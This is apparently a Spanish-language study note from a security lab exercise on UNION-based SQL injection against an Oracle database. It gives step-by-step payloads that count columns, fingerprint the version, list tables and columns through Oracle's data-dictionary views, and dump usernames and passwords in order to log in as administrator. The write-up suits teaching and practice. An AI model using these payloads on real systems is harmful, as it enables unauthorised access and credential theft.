Objetivo: Conseguir información de la BBDD y acceder como administrator.
Consulta Inicial: `SELECT * FROM atricles WHERE category=''`

#### Averiguar la cantidad de columnas que tiene la tabla en uso:
****
Si realizamos un ordenamiento respecto a la segunda columna con `' ORDER BY 2-- -`
o `' UNION SELECT "a","b" FROM dual-- -` en el caso del gestor Oracle, debemos indicarle una tabla, por defecto existe la tabla `dual`, al enviar la consulta vemos que la web no lanza ningun error. Por lo tanto entendemos que la tabla tiene 2 columnas.

Consulta para averiguar la cantidad de columnas de la tabla en uso: `' ORDER BY 2-- -`

Consulta para averiguar la cantidad de columnas de la tabla en uso (UNION): `' UNION SELECT "a","b" FROM dual-- -`

![[Pasted image 20250719140324.png]]

#### Averiguar a qué Base de Datos nos estamos enfrentando
****
Cada gestor de bases de datos tiene su forma de consultar la versión de la misma, de colocar comentarios, etc. Por lo tanto tendremos en cuenta lo siguiente al querer averiguar la versión.

Consulta versión Oracle: `' UNION SELECT banner,NULL FROM v$version-- -`

Consulta versión Oracle (alternativa): `' UNION SELECT version,NULL FROM v$instance-- -`

![[Pasted image 20250719141006.png]]

#### Conocer la tabla que almacena los usuarios y las contraseñas.
****
En el caso de Oracle, no contamos con una BBDD `information_schema`, por lo tanto haremos uso de "[vistas](https://www.ibm.com/docs/en/ias?topic=oracle-data-dictionary-compatible-views)" que nos proporciona Oracle.

Hay tres versiones diferentes de cada vista del diccionario de datos, y cada versión se identifica por el prefijo del nombre de la vista.

Las vistas devuelven información sobre los objetos a los que tiene acceso el usuario actual.
- `ALL_*` vistas devuelvan información sobre los objetos a los que tiene acceso el usuario actual.
- `DBA_*` vistas devuelven información sobre todos los objetos de la base de datos, independientemente de quién posea los posee.
- `USER_*` vistas devuelvan información sobre los objetos que son propiedad del usuario actual de la base de datos.

![[Pasted image 20250719143551.png]]


![[Pasted image 20250719143142.png]]

##### Listar todas las tablas de la BBDD
****
Consulta para listar las tablas Oracle: `' UNION SELECT table_name,NULL FROM all_tables-- -`

Esta consulta, toma el nombre (`table_name`) de todas las tablas (`all_tables`) de la BBDD.

![[Pasted image 20250719143937.png]]
![[Pasted image 20250719144014.png]]
Entre tantas tablas, vemos una llamada `USERS_NFLGDQ` donde pueden estar almacenadas las credenciales de autenticación de los usuarios.

##### Listar las columnas de la tabla USERS
****

![[Pasted image 20250719144540.png]]

Consulta para listar las tablas Oracle: `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_NFLGDQ'-- -`

![[Pasted image 20250719144451.png]]

##### Listar las credenciales de la BBDD de usuarios
****
Consulta para conocer la contraseña de un usuario Oracle: `' UNION SELECT USERNAME_NSAIHI,PASSWORD_NOSBHM FROM USERS_NFLGDQ-- -`

![[Pasted image 20250719145447.png]]

#### Loguearnos con las credenciales del usuario administrator.
****

![[Pasted image 20250719145617.png]]
![[Pasted image 20250719145655.png]]